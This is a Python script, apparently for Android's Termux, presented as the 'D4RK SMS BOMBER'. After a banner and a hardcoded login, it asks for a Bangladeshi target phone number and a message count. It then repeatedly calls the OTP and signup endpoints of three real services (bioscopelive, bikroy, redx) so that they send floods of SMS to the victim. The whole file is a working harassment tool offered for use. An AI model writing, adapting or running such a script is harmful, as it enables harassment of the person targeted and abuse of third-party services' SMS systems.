import os
import time
import requests
import webbrowser

# Install process and basic setup
print("\033[1;92mMR-D4RK (ROBOT) SYSTEM INSTALL. . . . \033[1;30m")
os.system("pkg install espeak")
print("\033[1;92mROBOT INSTALL COMPLETE \033[1;30m")
os.system('espeak -a 300 "Robot install complete"')

print("\033[1;92mUPDATE CHECKING BOSS MR-D4RK IS INSTALLED THE DEVICE\033[1;30m")
os.system('espeak -a 300 "UPDATE CHECKING BOSS MR-D4RK IS INSTALLED THE DEVICE"')

# Update process
os.system("git pull")

# Loading animation
animation = [
    "\033[30m[■□□□□□□□□□] 10%",
    "\033[34m[■■□□□□□□□□] 20%",
    "\033[33m[■■■□□□□□□□] 30%",
    "\033[32m[■■■■□□□□□□] 40%",
    "\033[31m[■■■■■□□□□□] 50%",
    "\033[39m[■■■■■■□□□□] 60%",
    "\033[37m[■■■■■■■□□□] 70%",
    "\033[36m[■■■■■■■■□□] 80%",
    "\033[35m[■■■■■■■■■□] 90%",
    "\033[34m[■■■■■■■■■■] 100% \n\n\n",
]

for i in animation:
    print(i)
    time.sleep(0.5)

# Login system
attempts = 0
max_attempts = 5

while attempts < max_attempts:
    username = input('\033[1;32mENTER USERNAME : ')
    password = input('\033[1;33mENTER PASSWORD : ')

    if username == 'MR' and password == 'D4RK':
        print(' \033[0;92mYou Have Successfully Logged in.')
        webbrowser.open("https://bdtools.top/site/sofiks-bio.html")
        break
    else:
        print(' Incorrect Pass Please Try Again')
        attempts += 1

# Display tool logo
os.system('clear')
logo3 = """
\033[1;31m▗▖  ▗▖▗▄▄▖     ▗▄▄▄  ▄  ▗▖▗▄▄▖ ▗▖ ▗▖
\033[1;32m▐▛▚▞▜▌▐▌ ▐▌    ▐▌  █ █  ▐▌▐▌ ▐▌▐▌▗▞▘
\033[1;33m▐▌  ▐▌▐▛▀▚▖    ▐▌  █ ▀▀▀▜▌▐▛▀▚▖▐▛▚▖ 
\033[1;34m▐▌  ▐▌▐▌ ▐▌    ▐▙▄▄▀    ▐▌▐▌ ▐▌▐▌ ▐▌
                                                                        
\033[1;94m[+]===============================================================[+]

\033[1;94m[+]\033[1;32m               CREATED BY   :  MR-D4RK                     \033[1;94m[+]

\033[1;94m[+]\033[1;32m               ON GITHUB    :  MR-D4RK-OFFICIAL                    \033[1;94m[+]

\033[1;94m[+]\033[1;32m               TOOL VERSION :  0.1                             \033[1;94m[+]

\033[1;94m[+]\033[1;32m               NETWORK      :  4G,5G                           \033[1;94m[+]

\033[1;94m[+]\033[1;32m               TOOL STATUS  :  FREE                            \033[1;94m[+]

\033[1;94m[+]\033[1;32m               TOOL'S NAME  : D4RK SMS BOMBER     	          \033[1;94m[+]

\033[1;94m[+]\033[1;32m               FACEBOOK     :  MD SOFIKUL ISLAM                       \033[1;94m[+]

\033[1;94m[+]===============================================================[+]

"""
print(logo3)

# Collecting target information
num = input("""  \033[38;5;46mTARGET NUMBER : +880""")
amount = int(input("\n  \033[38;5;46mSMS AMOUNT : "))

# SMS Bombing
headers1 = {
    "authority": "www.bioscopelive.com",
    "method": "GET",
    "scheme": "https",
    "accept": "*/*",
    "user-agent": "Mozilla/5.0 (Linux; Android 10)",
}

url1 = "https://www.bioscopelive.com/en/login/send-otp?phone=880" + num + "&operator=bd-otp"

headers2 = {
    "referer": "https://bikroy.com/",
    "user-agent": "Mozilla/5.0 (Linux; Android 10)",
}

url2 = "https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=0" + num

headers3 = {
    "referer": "https://redx.com.bd/",
    "user-agent": "Mozilla/5.0 (Linux; Android 10)",
}

data = {"name": num, "phoneNumber": num, "service": "redx"}

ses = 0

while amount > ses:
    sent1 = requests.get(url1, headers=headers1)
    if sent1.status_code == 200:
        ses += 1
        print(f"\n{ses}  \033[38;5;46mSMS SENT SUCCESSFULLY")

    sent2 = requests.get(url2, headers=headers2)
    if sent2.status_code == 200:
        ses += 1
        print(f"\n{ses}  \033[38;5;46mSMS SENT SUCCESSFULLY")

    send3 = requests.post("https://api.redx.com.bd/v1/user/signup", headers=headers3, data=data)
    if send3.status_code == 200:
        ses += 1
        print(f"\n{ses}  \033[38;5;46mSMS SENT SUCCESSFULLY")

# Ending message
os.system("clear")
print(""" \033[1;32m



      \033[38;5;46m____  ____  _  ________

     \033[38;5;46m/ __ \/ __ \/ | / / ____/

    \033[38;5;46m/ / / / / / /  |/ / __/   

   \033[38;5;46m/ /_/ / /_/ / /|  / /___   

  \033[38;5;46m/_____/\____/_/ |_/_____/   

                            

 TNQ FOR USING OUR TOOLS 🖤
""")
